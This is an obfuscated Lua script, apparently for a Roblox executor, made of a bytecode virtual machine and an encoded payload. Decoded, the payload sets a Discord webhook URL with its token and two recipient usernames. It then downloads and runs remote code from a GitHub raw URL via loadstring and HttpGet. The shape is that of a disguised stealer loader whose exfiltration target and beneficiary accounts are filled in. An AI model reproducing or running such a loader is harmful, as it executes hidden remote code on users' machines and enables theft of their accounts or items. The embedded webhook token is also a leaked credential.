do
	local v0 = tonumber;
	local v1 = string.byte;
	local v2 = string.char;
	local v3 = string.sub;
	local v4 = string.gsub;
	local v5 = string.rep;
	local v6 = table.concat;
	local v7 = table.insert;
	local v8 = math.ldexp;
	local v9 = getfenv or function()
		return _ENV;
	end;
	local v10 = setmetatable;
	local v11 = pcall;
	local v12 = select;
	local v13 = unpack or table.unpack;
	local v14 = tonumber;
	local function v15(v16, v17, ...)
		local v18 = 0;
		local v19;
		local v20;
		local v21;
		local v22;
		local v23;
		local v24;
		local v25;
		local v26;
		local v27;
		local v28;
		local v29;
		local v30;
		while true do
			if (v18 == 5) then
				v30 = nil;
				v30 = function(v31, v32, v33)
					local v39 = 0;
					local v40;
					local v41;
					local v42;
					while true do
						if (v39 == 1) then
							v42 = v31[3];
							return function(...)
								local v79 = 1;
								local v80 = -1;
								local v81 = {...};
								local v82 = v12("#", ...) - 1;
								local function v83()
									local v89 = v40;
									local v90 = v41;
									local v91 = v42;
									local v92 = v28;
									local v93 = {};
									local v94 = {};
									local v95 = {};
									for v100 = (459 + 552) - (192 + 819), v82 do
										if (((124 + 286) < (2871 - (96 + 387))) and (v100 >= v91)) then
											v93[v100 - v91] = v81[v100 + 1 + 0];
										else
											v95[v100] = v81[v100 + 1];
										end
									end
									local v96 = (v82 - v91) + (627 - (335 + 291));
									local v97;
									local v98;
									while true do
										local v101 = 160 - (112 + 48);
										local v102;
										while true do
											if (((1300 + 2046) <= ((6995 - (73 + 1429)) - (462 + 310))) and (v101 == (1882 - (1750 + 132)))) then
												v102 = 0;
												while true do
													if (((4571 - (101 + (1320 - 944))) < 4966) and (v102 == 1)) then
														if ((v98 <= (1 + 4)) or (3982 < 3960)) then
															if ((v98 <= (2 + 0)) or ((1164 + (2227 - (313 + 991))) < (118 + 748))) then
																if (((1641 - 378) <= (3133 - (670 + 863))) and (v98 <= (0 - 0))) then
																	v33[v97[3 + 0]] = v95[v97[2 + 0]];
																elseif ((v98 > (1 - 0)) or ((6387 - 4766) > (4577 - (854 + 280)))) then
																	local v139 = 0 + 0;
																	local v140;
																	local v141;
																	local v142;
																	local v143;
																	local v144;
																	while true do
																		if ((v139 == (1629 - (168 + (3083 - 1624)))) or ((5716 - (834 + 466)) <= (1802 + 542))) then
																			v144 = nil;
																			while true do
																				if ((v140 == (1 - 0)) or ((2479 - 793) >= 2711)) then
																					local v166 = 0 - 0;
																					local v167;
																					while true do
																						if ((1853 > 242) and (0 == v166)) then
																							v167 = 0;
																							while true do
																								if (((2295 - (178 + 712)) < (1937 + 396)) and (v167 == (2 - 1))) then
																									v140 = 4 - 2;
																									break;
																								end
																								if ((v167 == (0 - 0)) or (((8577 - (1699 + 162)) - 5342) <= (2554 - 1868))) then
																									local v184 = 0 + 0;
																									while true do
																										if (((5452 - (238 + 597 + 496)) > (2143 + 804)) and (v184 == (1303 - ((2041 - (592 + 155)) + 9)))) then
																											v80 = (v143 + v141) - (1841 - (918 + 922));
																											v144 = 1740 - (310 + 1430);
																											v184 = (1 + 0) - (0 + 0);
																										end
																										if ((((4460 - (149 + 193)) - (1457 + 99)) <= (3203 + 1266)) and (((2038 - (156 + 146)) - (827 + 908)) == v184)) then
																											v167 = 1;
																											break;
																										end
																									end
																								end
																							end
																							break;
																						end
																					end
																				end
																				if (((1219 + 228) < (3298 + (891 - 252))) and (v140 == (1 + 1))) then
																					for v171 = v141, v80 do
																						local v172 = 1652 - (432 + 17 + 1203);
																						while true do
																							if ((v172 == (0 + 0)) or ((3725 - 2832) == (4327 - ((1097 - (648 + 337)) + 317)))) then
																								v144 = v144 + (2 - 1);
																								v95[v171] = v142[v144];
																								break;
																							end
																						end
																					end
																					break;
																				end
																				if (((8821 - 5090) >= (144 + 271)) and (v140 == (0 - 0))) then
																					local v168 = 0 + 0;
																					while true do
																						if ((v168 == 1) or (617 == ((5574 - (870 + 305)) - (532 + 158)))) then
																							v140 = 2 - 1;
																							break;
																						end
																						if ((v168 == 0) or ((5007 - (444 + 255)) >= ((6805 - (1082 + 565)) - ((571 - 395) + 423)))) then
																							v141 = v97[2 + 0];
																							v142, v143 = v92(v95[v141](v13(v95, v141 + (1162 - (1097 + 64)), v97[970 - (859 + 108)])));
																							v168 = 1 + 0;
																						end
																					end
																				end
																			end
																			break;
																		end
																		if ((((1146 + 2785) - (382 + 602)) > (368 - 221)) and (v139 == (1 + 0))) then
																			v142 = nil;
																			v143 = nil;
																			v139 = 9 - 7;
																		end
																		if ((3082 < (20985 - 16396)) and (v139 == (0 + 0))) then
																			v140 = 343 - (165 + 178);
																			v141 = nil;
																			v139 = 268 - (263 + 4);
																		end
																	end
																else
																	local v145 = 0 + 0;
																	local v146;
																	local v147;
																	while true do
																		if ((v145 == (778 - (269 + 508))) or ((8578 - 5995) <= (444 + 1459))) then
																			while true do
																				if ((((529 + 359) - 572) <= (4068 - 2173)) and (v146 == (0 - 0))) then
																					v147 = v97[1783 - (1312 + 469)];
																					v95[v147] = v95[v147](v13(v95, v147 + 1 + 0, v80));
																					break;
																				end
																			end
																			break;
																		end
																		if ((v145 == (0 + (1506 - (266 + 1240)))) or ((729 - (127 + 410)) > (2118 + 1169))) then
																			v146 = 0;
																			v147 = nil;
																			v145 = (1 + 1) - (1 + 0);
																		end
																	end
																end
															elseif ((v98 <= 3) or ((5932 - (623 + 976)) < (9499 - 6004))) then
																local v130 = 0 - 0;
																local v131;
																local v132;
																local v133;
																while true do
																	if ((((5644 - (383 + 1300)) - (68 + 154)) >= (1912 + 1005)) and (v130 == ((373 + 105) - (377 + 101)))) then
																		v131 = 0;
																		v132 = nil;
																		v130 = 1 + 0;
																	end
																	if ((715 < (692 + (4537 - (299 + 41)))) and ((1 - (931 - (288 + 643))) == v130)) then
																		v133 = nil;
																		while true do
																			if ((4005 > (1092 - (1945 - (57 + 1495)))) and (v131 == (1137 - (213 + (2817 - (785 + 1108)))))) then
																				local v162 = 1729 - (1530 + 199);
																				while true do
																					if ((v162 == (0 + 0)) or ((902 + 3512) == 923)) then
																						v132 = v97[2 + 0];
																						v133 = v95[v97[1586 - (1087 + 496)]];
																						v162 = 4 - 3;
																					end
																					if ((v162 == (4 - 3)) or ((4360 - (905 + 226)) < (957 + 43))) then
																						v131 = 1166 - (93 + 173 + 899);
																						break;
																					end
																				end
																			end
																			if ((v131 == 1) or ((3887 - (347 + 216)) <= 1960)) then
																				v95[v132 + 1 + 0] = v133;
																				v95[v132] = v133[v97[1 + 3]];
																				break;
																			end
																		end
																		break;
																	end
																end
															elseif (((4044 - (1150 + 156)) >= (2494 + 222)) and (v98 == (12 - 8))) then
																v95[v97[4 - 2]]();
															else
																v95[v97[1 + 1]] = v97[(51 + 1214) - (403 + 859)] ~= 0;
															end
														elseif ((v98 <= (1627 - (1345 + 274))) or ((5228 - 1725) <= (1849 - 778))) then
															if ((v98 <= 6) or ((2729 - (171 + 260 + 177)) == (438 + 1542))) then
																v79 = v97[3];
															elseif (((109 + 105 + 258) >= (1942 - (1162 + (655 - (49 + 296))))) and (v98 == 7)) then
																v95[v97[3 - 1]] = v33[v97[3]];
															else
																v95[v97[2 + 0]] = v97[975 - ((1697 - (936 + 37)) + (386 - 138))];
															end
														elseif ((891 <= ((2948 + 1526) - (414 + 1144))) and (v98 <= (1141 - (140 + 992)))) then
															if ((v95[v97[180 - (64 + 114)]] == v97[620 - (381 + 235)]) or (2477 == (561 + 1143))) then
																v79 = v79 + (2 - 1);
															else
																v79 = v97[11 - (20 - 12)];
															end
														elseif ((3348 >= (1826 - 670)) and (v98 > (354 - (294 + 50)))) then
															do
																return;
															end
														else
															for v154 = v97[2], v97[77 - (55 + 19)] do
																v95[v154] = nil;
															end
														end
														v79 = v79 + (639 - (410 + 228));
														break;
													end
													if ((v102 == ((0 - 0) - 0)) or (2770 > (15387 - 11548))) then
														local v111 = 0 - (926 - (761 + 165));
														local v112;
														while true do
															if ((v111 == (0 - 0)) or ((37 + 590) >= (3936 - 1467))) then
																v112 = 786 - (329 + 457);
																while true do
																	if (((1879 + 212) == (1777 + 314)) and (1 == v112)) then
																		v102 = 203 - (12 + 190);
																		break;
																	end
																	if (((2888 - 976) > 633) and (v112 == (0 - 0))) then
																		v97 = v89[v79];
																		v98 = v97[1 - 0];
																		v112 = 4 - 3;
																	end
																end
																break;
															end
														end
													end
												end
												break;
											end
										end
									end
								end
								A, B = v28(v11(v83));
								if not A[1] then
									local v103 = v31[4][v79] or "?";
									error("Script error at [" .. v103 .. "]:" .. A[2]);
								else
									return v13(A, 2, B);
								end
							end;
						end
						if (0 == v39) then
							v40 = v31[1];
							v41 = v31[2];
							v39 = 1;
						end
					end
				end;
				return v30(v29(), {}, v17)(...);
			end
			if (v18 == 2) then
				v23 = function()
					local v43 = 0 + 0;
					local v44;
					local v45;
					while true do
						if (v43 == ((902 - (568 + 331)) - 2)) then
							return (v45 * (98 + 158)) + v44;
						end
						if ((34 - (29 + 5)) == v43) then
							v44, v45 = v1(v16, v19, v19 + (3 - (678 - (55 + 622))));
							v19 = v19 + (9 - 7);
							v43 = 3 - 2;
						end
					end
				end;
				v24 = nil;
				v24 = function()
					local v46 = 49 - (7 + 42);
					local v47;
					local v48;
					local v49;
					local v50;
					while true do
						if (1 == v46) then
							return (v50 * (16778034 - (580 + (389 - (90 + 61))))) + (v49 * 65536) + (v48 * (1093 - 837)) + v47;
						end
						if (v46 == (1782 - ((2477 - 1706) + 1011))) then
							v47, v48, v49, v50 = v1(v16, v19, v19 + 2 + 1);
							v19 = v19 + (1021 - ((1982 - (603 + 603)) + 241));
							v46 = 1 + (0 - 0);
						end
					end
				end;
				v25 = nil;
				v18 = 3;
			end
			if (v18 == 1) then
				v21 = function(v34, v35, v36)
					if v36 then
						local v70 = 0 + 0;
						local v71;
						while true do
							if (v70 == (0 + 0)) then
								v71 = (v34 / ((2 + 0) ^ (v35 - (1 - 0)))) % ((2 - (0 + 0)) ^ (((v36 - (729 - (99 + 81 + 548))) - (v35 - ((2393 - 1742) - (476 + 174)))) + 1));
								return v71 - (v71 % (1 + 0));
							end
						end
					else
						local v72 = ((7 - 5) + 0) ^ (v35 - ((2058 - 1327) - (690 + 40)));
						return (((v34 % (v72 + v72)) >= v72) and (2 - 1)) or (0 + 0);
					end
				end;
				v22 = nil;
				v22 = function()
					local v51 = 0 + 0;
					local v52;
					while true do
						if (v51 == ((1935 - (1929 + 6)) - (0 - 0))) then
							v52 = v1(v16, v19, v19);
							v19 = v19 + (2 - 1);
							v51 = 157 - (100 + 56);
						end
						if (v51 == (1 + 0)) then
							return v52;
						end
					end
				end;
				v23 = nil;
				v18 = 2;
			end
			if (v18 == 4) then
				v28 = nil;
				v28 = function(...)
					return {...}, v12("#", ...);
				end;
				v29 = nil;
				v29 = function()
					local v53 = 0;
					local v54;
					local v55;
					local v56;
					local v57;
					local v58;
					local v59;
					local v60;
					while true do
						if (v53 == (1214 - (584 + 627))) then
							v60 = nil;
							while true do
								local v84 = 0;
								while true do
									if (v84 ~= (1 - 0)) then
									else
										if (v54 ~= 0) then
										else
											local v108 = 1810 - (1305 + 505);
											while true do
												if (v108 == 2) then
													v54 = 1;
													break;
												end
												if ((1 + 0) == v108) then
													v57 = {};
													v58 = {v55,v56,nil,v57};
													v108 = 2;
												end
												if (v108 == 0) then
													v55 = {};
													v56 = {};
													v108 = 1 - 0;
												end
											end
										end
										break;
									end
									if (v84 == (0 + 0)) then
										if ((1867 - (798 + 1068)) == v54) then
											local v109 = 0;
											while true do
												if (v109 == (1206 - (742 + 464))) then
													v59 = v24();
													v60 = {};
													v109 = 1;
												end
												if (v109 ~= (2 - 0)) then
												else
													v54 = 1169 - (335 + 832);
													break;
												end
												if (v109 ~= (2 - 1)) then
												else
													for v114 = 1 - 0, v59 do
														local v115 = 0;
														local v116;
														local v117;
														local v118;
														while true do
															if (v115 == 0) then
																v116 = 0 + 0;
																v117 = nil;
																v115 = 1674 - (1514 + 159);
															end
															if ((3 - 2) ~= v115) then
															else
																v118 = nil;
																while true do
																	if (0 ~= v116) then
																	else
																		local v137 = 0 + 0;
																		while true do
																			if (v137 ~= (0 + 0)) then
																			else
																				v117 = v22();
																				v118 = nil;
																				v137 = 1929 - (1606 + 322);
																			end
																			if (v137 ~= 1) then
																			else
																				v116 = 709 - (156 + 552);
																				break;
																			end
																		end
																	end
																	if (v116 == 1) then
																		if (v117 == 1) then
																			v118 = v22() ~= (0 + 0);
																		elseif (v117 == 2) then
																			v118 = v25();
																		elseif (v117 == 3) then
																			v118 = v26();
																		end
																		v60[v114] = v118;
																		break;
																	end
																end
																break;
															end
														end
													end
													v58[1802 - (751 + 1048)] = v22();
													v109 = 1 + 1;
												end
											end
										end
										if (v54 == 2) then
											local v110 = 0;
											while true do
												if (v110 == 0) then
													for v119 = 1, v24() do
														local v120 = 1046 - (593 + 453);
														local v121;
														local v122;
														while true do
															if (v120 == (1077 - (449 + 628))) then
																local v127 = 0;
																while true do
																	if (v127 ~= 0) then
																	else
																		v121 = 0;
																		v122 = nil;
																		v127 = 1;
																	end
																	if (v127 ~= (2 - 1)) then
																	else
																		v120 = 1;
																		break;
																	end
																end
															end
															if (v120 == (86 - (80 + 5))) then
																while true do
																	if (v121 == (1402 - (600 + 802))) then
																		v122 = v22();
																		if (v21(v122, 1773 - (1463 + 309), 1087 - (147 + 939)) ~= 0) then
																		else
																			local v156 = 0 - 0;
																			local v157;
																			local v158;
																			local v159;
																			local v160;
																			local v161;
																			while true do
																				if (v156 ~= 2) then
																				else
																					v161 = nil;
																					while true do
																						if ((1381 - (1271 + 110)) == v157) then
																							local v175 = 0 - 0;
																							while true do
																								if ((0 - 0) == v175) then
																									v158 = 0 - 0;
																									v159 = nil;
																									v175 = 637 - (292 + 344);
																								end
																								if (v175 ~= 1) then
																								else
																									v157 = 1;
																									break;
																								end
																							end
																						end
																						if (v157 ~= (5 - 3)) then
																						else
																							while true do
																								if (v158 ~= (3 + 0)) then
																								else
																									if (v21(v160, 10 - 7, 3) == 1) then
																										v161[4] = v60[v161[11 - 7]];
																									end
																									v55[v119] = v161;
																									break;
																								end
																								if (v158 == 1) then
																									local v181 = 1544 - (824 + 720);
																									while true do
																										if (v181 ~= 0) then
																										else
																											v161 = {v23(),v23(),nil,nil};
																											if (v159 == 0) then
																												local v191 = 0 - 0;
																												local v192;
																												while true do
																													if (v191 == 0) then
																														v192 = 0;
																														while true do
																															if (0 ~= v192) then
																															else
																																v161[3] = v23();
																																v161[4] = v23();
																																break;
																															end
																														end
																														break;
																													end
																												end
																											elseif (v159 == (2 - 1)) then
																												v161[3] = v24();
																											elseif (v159 == (2 - 0)) then
																												v161[2 + 1] = v24() - (2 ^ (15 + 1));
																											elseif (v159 ~= (9 - 6)) then
																											else
																												local v198 = 0;
																												while true do
																													if ((0 - 0) ~= v198) then
																													else
																														v161[6 - 3] = v24() - ((1359 - (376 + 981)) ^ 16);
																														v161[7 - 3] = v23();
																														break;
																													end
																												end
																											end
																											v181 = 1985 - (563 + 1421);
																										end
																										if (v181 == 1) then
																											v158 = 5 - 3;
																											break;
																										end
																									end
																								end
																								if (v158 ~= 0) then
																								else
																									local v182 = 0;
																									local v183;
																									while true do
																										if (0 == v182) then
																											v183 = 0 + 0;
																											while true do
																												if (0 ~= v183) then
																												else
																													local v193 = 0;
																													while true do
																														if (v193 ~= 0) then
																														else
																															v159 = v21(v122, 2, 1 + 2);
																															v160 = v21(v122, 12 - 8, 6);
																															v193 = 1;
																														end
																														if (v193 ~= (1 - 0)) then
																														else
																															v183 = 1567 - (133 + 1433);
																															break;
																														end
																													end
																												end
																												if (1 == v183) then
																													v158 = 1;
																													break;
																												end
																											end
																											break;
																										end
																									end
																								end
																								if (v158 == 2) then
																									if (v21(v160, 1 + 0, 1) ~= (2 - 1)) then
																									else
																										v161[2] = v60[v161[1589 - (986 + 601)]];
																									end
																									if (v21(v160, 2, 9 - 7) ~= 1) then
																									else
																										v161[3] = v60[v161[3]];
																									end
																									v158 = 1983 - (1593 + 387);
																								end
																							end
																							break;
																						end
																						if (v157 == (1 + 0)) then
																							local v176 = 0;
																							while true do
																								if (v176 ~= (2 - 1)) then
																								else
																									v157 = 1 + 1;
																									break;
																								end
																								if (v176 ~= (453 - (325 + 128))) then
																								else
																									v160 = nil;
																									v161 = nil;
																									v176 = 1;
																								end
																							end
																						end
																					end
																					break;
																				end
																				if (v156 == (932 - (128 + 804))) then
																					v157 = 1551 - (392 + 1159);
																					v158 = nil;
																					v156 = 1;
																				end
																				if (v156 ~= (1 + 0)) then
																				else
																					v159 = nil;
																					v160 = nil;
																					v156 = 2;
																				end
																			end
																		end
																		break;
																	end
																end
																break;
															end
														end
													end
													for v123 = 1, v24() do
														v56[v123 - 1] = v29();
													end
													v110 = 1;
												end
												if (v110 ~= (1265 - (1205 + 59))) then
												else
													for v125 = 1 + 0, v24() do
														v57[v125] = v24();
													end
													return v58;
												end
											end
										end
										v84 = 1836 - (1009 + 826);
									end
								end
							end
							break;
						end
						if (v53 ~= (0 - 0)) then
						else
							v54 = 0 + 0;
							v55 = nil;
							v53 = 4 - 3;
						end
						if (v53 == 2) then
							local v77 = 0;
							while true do
								if (v77 ~= (890 - (862 + 27))) then
								else
									v53 = 1437 - (588 + 846);
									break;
								end
								if (v77 ~= 0) then
								else
									v58 = nil;
									v59 = nil;
									v77 = 1 - 0;
								end
							end
						end
						if (v53 ~= 1) then
						else
							local v78 = 0 - 0;
							while true do
								if (v78 == (0 - 0)) then
									v56 = nil;
									v57 = nil;
									v78 = 1094 - (139 + 954);
								end
								if (v78 ~= (1631 - (1507 + 123))) then
								else
									v53 = 2;
									break;
								end
							end
						end
					end
				end;
				v18 = 5;
			end
			if (v18 == 0) then
				v19 = 1;
				v20 = nil;
				v16 = v4(v3(v16, 5), "..", function(v37)
					if (v1(v37, 2) == 79) then
						v20 = v0(v3(v37, 1, 1));
						return "";
					else
						local v73 = v2(v0(v37, 16));
						if v20 then
							local v85 = v5(v73, v20);
							v20 = nil;
							return v85;
						else
							return v73;
						end
					end
				end);
				v21 = nil;
				v18 = 1;
			end
			if (v18 == 3) then
				v25 = function()
					local v61 = v24();
					local v62 = v24();
					local v63 = (984 - (475 + 195)) - (305 + 8);
					local v64 = (v21(v62, (1958 - 1299) - (261 + 397), 15 + 5) * ((2 + 0 + 0) ^ (2 + 30))) + v61;
					local v65 = v21(v62, 19 + 2, 14 + 17);
					local v66 = ((v21(v62, 972 - (328 + 612)) == (1 - 0)) and -(1 + 0)) or (1411 - (1300 + (328 - 218)));
					if (v65 == ((2688 - (1054 + 104)) - ((2181 - 758) + 107))) then
						if (v64 == 0) then
							return v66 * (0 + 0);
						else
							local v86 = 0 + 0;
							while true do
								if (v86 == (0 + 0)) then
									v65 = (4 - 3) + 0;
									v63 = 0 - 0;
									break;
								end
							end
						end
					elseif (v65 == (3233 - (406 + 780))) then
						return ((v64 == (0 + (0 - 0))) and (v66 * (((2189 - 832) - (859 + 497)) / (1067 - (850 + 217))))) or (v66 * NaN);
					end
					return v8(v66, v65 - (1367 - (132 + 212))) * (v63 + (v64 / (((9 - 2) - 5) ^ (218 - 166))));
				end;
				v26 = nil;
				v26 = function(v38)
					local v67 = 821 - (206 + 615);
					local v68;
					local v69;
					while true do
						if (v67 == ((1445 - (837 + 607)) + 0)) then
							v68 = v3(v16, v19, (v19 + v38) - (1096 - (612 + 483)));
							v19 = v19 + v38;
							v67 = 5 - 3;
						end
						if (v67 == 3) then
							return v6(v69);
						end
						if ((520 - (65 + 455)) == v67) then
							v68 = nil;
							if not v38 then
								local v99 = 60 - (52 + 8);
								while true do
									if (v99 == 0) then
										v38 = v24();
										if (v38 == (0 - 0)) then
											return "";
										end
										break;
									end
								end
							end
							v67 = 1 + 0;
						end
						if (v67 == (1118 - (720 + 396))) then
							v69 = {};
							for v87 = 1 + 0, #v68 do
								v69[v87] = v2(v1(v3(v68, v87, v87)));
							end
							v67 = 1 + 1 + 1;
						end
					end
				end;
				v27 = v24;
				v18 = 4;
			end
		end
	end
	v15("LOL!0C3O00028O00026O00F03F03073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313038333730393335332O363135372O312O332F476739566C477A747358424D7A4A532O58615A374546455F4D5449514E42633042626A4C70527A775354495836527A64474C504F794D33364D686B6156774667435F554D030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403323O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F507378302F412F6D61696E2F6D61696E03083O00557365724E616D65030C3O004F617269734661726D416C7403093O00557365724E616D653203083O004F6172697344454400253O0012083O00014O000A000100013O0026093O0002000100010004063O00020001001208000100013O00260900010012000100020004063O00120001001208000200043O00122O000200033O001207000200053O001207000300063O002003000300030007001208000500084O0005000600014O0002000300064O000100023O00022O00040002000100010004063O0024000100260900010005000100010004063O00050001001208000200013O0026090002001C000100010004063O001C00010012080003000A3O00122O000300093O0012080003000C3O00122O0003000B3O001208000200023O00260900020015000100020004063O00150001001208000100023O0004063O000500010004063O001500010004063O000500010004063O002400010004063O000200012O000B3O00017O00253O00023O00033O00053O00053O00063O00083O00083O00093O00093O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000B3O000D3O000D3O000E3O00103O00103O00113O00113O00123O00123O00133O00153O00153O00163O00173O00183O001A3O001C3O001D3O001F3O00", v9(), ...);
end
